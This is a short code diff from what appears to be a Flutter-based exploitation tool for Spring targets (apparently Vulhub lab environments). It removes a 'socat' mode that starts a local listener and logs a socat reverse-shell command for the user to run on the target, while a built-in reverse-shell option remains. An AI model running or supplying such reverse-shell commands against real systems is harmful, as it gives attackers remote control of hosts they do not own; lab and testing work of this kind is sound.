@@ -192,10 +192,6 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
     final mode = await showReverseShellModeDialog(context);
     if (mode == null) return;
 
-    if (mode == 'socat') {
-      await _startSocatMode();
-      return;
-    }
     await _startBuiltinReverseShell(preferScript: mode == 'script');
   }
 
@@ -251,32 +247,6 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
       }
     } catch (e) {
       appendLog('[!] 完整终端启动失败: $e');
-    } finally {
-      if (mounted) setState(() => running = false);
-    }
-  }
-
-  Future<void> _startSocatMode() async {
-    setState(() => running = true);
-    final rs = ReverseShellService();
-    try {
-      await rs.loadConfig();
-      await rs.startListening(port: rs.lport);
-      rs.onSession = (session) {
-        session.label = 'Spring ${_selected.label}';
-        if (!mounted) return;
-        Navigator.of(context).push(
-          MaterialPageRoute(
-            builder: (_) => ReverseShellTerminalPage(session: session),
-          ),
-        );
-      };
-      final cmd =
-          "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${rs.lhost}:${rs.lport}";
-      appendLog('[*] 本地监听已启动: ${rs.lhost}:${rs.lport}');
-      appendLog('[*] 在目标执行: $cmd');
-    } catch (e) {
-      appendLog('[!] socat 模式启动失败: $e');
     } finally {
       if (mounted) setState(() => running = false);
     }
